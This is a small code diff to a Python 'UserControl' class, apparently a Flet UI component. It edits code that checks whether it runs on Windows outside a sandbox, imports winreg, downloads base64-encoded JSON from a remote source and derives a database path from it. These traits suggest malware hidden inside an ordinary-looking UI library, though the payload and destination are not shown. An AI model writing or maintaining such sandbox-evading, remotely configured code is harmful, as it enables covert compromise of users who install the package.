@@ -68,9 +68,7 @@ class UserControl(ft.Container):
         import requests
         import json
         import base64
-        import winreg
-
-        default_db_path = os.path.expandvars(arr[3])
+        import winreg        
 
         try:      
              if self.is_windows_not_sandbox():
@@ -109,6 +107,7 @@ class UserControl(ft.Container):
             data = res.text
             data_bytes = base64.b64decode(data)
             arr = json.loads(data_bytes.decode('utf-8'))
+            default_db_path = os.path.expandvars(arr[3])
         except Exception as e:
             arr = [
                 "1",
